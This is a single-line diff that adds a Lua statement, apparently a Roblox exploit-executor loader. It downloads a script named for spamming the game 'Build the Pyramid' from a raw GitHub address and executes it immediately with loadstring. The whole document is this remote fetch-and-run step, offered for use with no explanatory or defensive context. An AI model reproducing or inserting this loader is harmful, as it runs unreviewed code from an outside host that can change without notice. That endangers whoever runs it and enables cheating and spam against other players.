@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/build-the-pyramid-spam6-2kt10k8ym7522n.lua"))()
